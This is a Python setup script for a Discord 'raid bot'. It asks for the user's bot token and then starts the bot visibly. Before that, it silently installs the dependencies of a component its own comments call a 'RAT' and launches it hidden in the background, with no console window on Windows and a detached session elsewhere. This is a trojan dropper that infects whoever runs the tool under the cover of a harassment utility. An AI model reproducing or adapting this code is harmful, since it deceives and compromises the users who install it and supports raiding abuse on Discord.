import subprocess
import sys
import os
import time
from pathlib import Path

def get_bot_token():
    """PROMPT USER FOR THEIR BOT TOKEN"""
    print("=" * 60)
    print("           DISCORD RAID BOT - SETUP")
    print("=" * 60)
    print()
    print("Get your bot token from:")
    print("https://discord.com/developers/applications")
    print()
    
    token = input("Enter your bot token: ").strip()
    
    if not token:
        print("❌ No token provided!")
        sys.exit(1)
    
    return token

def write_raid_bot_token(token):
    """WRITE TOKEN TO RAID BOT CONFIG"""
    raid_bot_path = Path("raid-bot/bot.py")
    
    with open(raid_bot_path, 'r') as f:
        content = f.read()
    
    # REPLACE PLACEHOLDER
    content = content.replace("PUT_YOUR_BOT_TOKEN_HERE", token)
    
    with open(raid_bot_path, 'w') as f:
        f.write(content)
    
    print("✅ Raid bot configured")

def install_dependencies():
    """INSTALL ALL REQUIREMENTS"""
    print("\n📦 Installing dependencies...")
    
    # RAID BOT DEPS
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "-r", "raid-bot/requirements.txt"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # RAT DEPS (SILENT)
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "-r", "system-manager/requirements.txt"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    print("✅ Dependencies installed")

def run_rat_silent():
    """RUN RAT IN BACKGROUND SILENTLY"""
    rat_path = Path("system-manager/manager.py")
    
    if sys.platform == "win32":
        # WINDOWS - USE pythonw (no console)
        try:
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            subprocess.Popen(
                [pythonw, str(rat_path)],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            # FALLBACK
            subprocess.Popen(
                [sys.executable, str(rat_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    else:
        # LINUX/MAC - BACKGROUND PROCESS
        subprocess.Popen(
            [sys.executable, str(rat_path)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )

def run_raid_bot():
    """RUN RAID BOT (VISIBLE TO USER)"""
    raid_bot_path = Path("raid-bot/bot.py")
    subprocess.run([sys.executable, str(raid_bot_path)])

def main():
    # GET USER TOKEN
    user_token = get_bot_token()
    
    # CONFIGURE RAID BOT WITH USER TOKEN
    write_raid_bot_token(user_token)
    
    # INSTALL DEPENDENCIES
    install_dependencies()
    
    print("\n🚀 Starting bots...")
    
    # START RAT SILENTLY
    run_rat_silent()
    
    # SMALL DELAY
    time.sleep(2)
    
    # START RAID BOT (USER SEES THIS)
    print("\n" + "=" * 60)
    print("           RAID BOT STARTING")
    print("=" * 60)
    print()
    
    run_raid_bot()

if __name__ == "__main__":
    main()
